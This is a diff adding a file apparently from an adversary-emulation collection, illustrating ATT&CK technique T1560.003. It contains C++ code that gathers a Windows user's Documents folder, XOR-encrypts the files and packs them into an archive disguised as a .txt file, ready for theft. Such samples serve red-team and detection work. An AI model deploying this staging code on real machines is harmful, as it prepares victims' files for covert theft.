@@ -1,0 +1,106 @@
+---
+title: "T1560.003.Archive via Custom Method"
+folder: "11. Collection"
+---
+
+
+
+
+
+#include <windows.h>
+#include <fstream>
+#include <iostream>
+#include <filesystem>
+#include <vector>
+#include <algorithm>
+#include <sstream>
+
+void encryptData(std::vector<char>& data, const std::string& key) {
+    for (size_t i = 0; i < data.size(); ++i) {
+        data[i] ^= key[i % key.size()];
+    }
+}
+
+void archiveAndEncryptDirectory(const std::string& directory, const std::string& outputFilename, const std::string& encryptionKey) {
+    std::ofstream archive(outputFilename, std::ios::binary);
+    if (!archive.is_open()) {
+        std::cerr << "Failed to create archive: " << outputFilename << std::endl;
+        return;
+    }
+
+    for (const auto& entry : std::filesystem::recursive_directory_iterator(directory)) {
+        if (std::filesystem::is_regular_file(entry)) {
+            std::ifstream inputFile(entry.path(), std::ios::binary);
+            if (inputFile.is_open()) {
+                std::vector<char> fileContent((std::istreambuf_iterator<char>(inputFile)), std::istreambuf_iterator<char>());
+                inputFile.close();
+                encryptData(fileContent, encryptionKey);
+
+                int fileNameSize = entry.path().filename().string().size();
+                archive.write(reinterpret_cast<const char*>(&fileNameSize), sizeof(int));
+                archive.write(entry.path().filename().string().c_str(), fileNameSize);
+                int fileSize = fileContent.size();
+                archive.write(reinterpret_cast<const char*>(&fileSize), sizeof(int));
+
+                archive.write(fileContent.data(), fileContent.size());
+            }
+            else {
+                std::cerr << "Failed to open file: " << entry.path() << std::endl;
+            }
+        }
+    }
+
+    archive.close();
+}
+
+void decryptData(std::vector<char>& data, const std::string& key) {
+    for (size_t i = 0; i < data.size(); ++i) {
+        data[i] ^= key[i % key.size()];
+    }
+}
+
+void decryptDirectory(const std::string& inputFilename, const std::string& decryptionKey) {
+    std::string outputDirectory = "decrypted_files";
+    std::filesystem::create_directory(outputDirectory);
+
+    std::ifstream inputFile(inputFilename, std::ios::binary);
+    if (!inputFile.is_open()) {
+        std::cerr << "Failed to open input file: " << inputFilename << std::endl;
+        return;
+    }
+
+    while (inputFile.peek() != EOF) {
+        int fileNameSize, fileSize;
+        inputFile.read(reinterpret_cast<char*>(&fileNameSize), sizeof(int));
+        if (fileNameSize == 0) break;
+        std::string fileName;
+        fileName.resize(fileNameSize);
+        inputFile.read(&fileName[0], fileNameSize);
+        inputFile.read(reinterpret_cast<char*>(&fileSize), sizeof(int));
+        std::vector<char> fileContent(fileSize);
+        inputFile.read(fileContent.data(), fileSize);
+        decryptData(fileContent, decryptionKey);
+
+        std::string decryptedFilePath = outputDirectory + "/" + fileName;
+
+        std::ofstream outputFile(decryptedFilePath, std::ios::binary);
+        outputFile.write(fileContent.data(), fileContent.size());
+        outputFile.close();
+    }
+    inputFile.close();
+}
+int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
+
+
+    std::string directoryToArchive = "C:\\Users\\User\\Documents";
+    std::string outputArchiveName = "nazwa_archiwum.txt";
+    std::string encryptionKey = "123";
+
+    archiveAndEncryptDirectory(directoryToArchive, outputArchiveName, encryptionKey);
+    //std::string decryptionKey = "123";
+    //std::string inputFilename = "nazwa_archiwum.txt";
+
+    //decryptDirectory(inputFilename, decryptionKey);
+
+    return 0;
+}
